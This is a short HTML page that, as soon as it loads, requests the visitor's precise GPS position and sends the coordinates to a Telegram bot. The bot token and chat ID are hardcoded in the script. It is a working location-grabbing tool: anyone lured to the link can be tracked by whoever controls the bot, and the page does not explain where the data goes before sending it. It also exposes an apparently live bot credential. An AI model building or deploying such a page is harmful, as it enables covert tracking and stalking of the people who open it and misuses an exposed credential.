<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>GPS Location Sender</title>
</head>
<body>
  <h1>Requesting GPS access...</h1>
  <p id="status">Waiting for permission...</p>

  <script>
    const BOT_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
    const CHAT_ID = "6978055162";

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then(res => {
          if (res.ok) {
            document.getElementById("status").innerText = "‚úÖ Location sent to Telegram.";
          } else {
            document.getElementById("status").innerText = "‚ùå Failed to send location.";
          }
        })
        .catch(() => {
          document.getElementById("status").innerText = "‚ùå Error sending location.";
        });
    }

    function getLocation() {
      if (!navigator.geolocation) {
        document.getElementById("status").innerText = "‚ùå Geolocation is not supported by your browser.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const message = `üìç User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
          sendToTelegram(message);
        },
        (error) => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              document.getElementById("status").innerText = "‚ùå Permission denied.";
              break;
            case error.POSITION_UNAVAILABLE:
              document.getElementById("status").innerText = "‚ùå Location unavailable.";
              break;
            case error.TIMEOUT:
              document.getElementById("status").innerText = "‚ùå Request timed out.";
              break;
            default:
              document.getElementById("status").innerText = "‚ùå Unknown error.";
              break;
          }
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }

    // Start the location request when page loads
    window.onload = getLocation;
  </script>
</body>
</html>
